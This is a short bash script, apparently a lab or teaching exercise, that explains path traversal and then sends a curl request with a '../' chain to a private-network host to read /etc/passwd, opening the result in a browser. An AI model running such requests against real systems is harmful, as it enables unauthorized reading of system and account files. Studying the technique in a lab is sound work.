#!/bin/bash/

echo "URL: http://192.168.1.68/?page="

echo "this method is called path traversal, our aim is to understand how deep the directory is:"

echo "curl -s http://192.168.1.68/?page=../../../../../../../../../../../etc/passwd -o response.html"

echo "press enter to continue"

read enter

curl -s http://192.168.1.68/?page=../../../../../../../../../../../etc/passwd -o response.html

google-chrome response.html
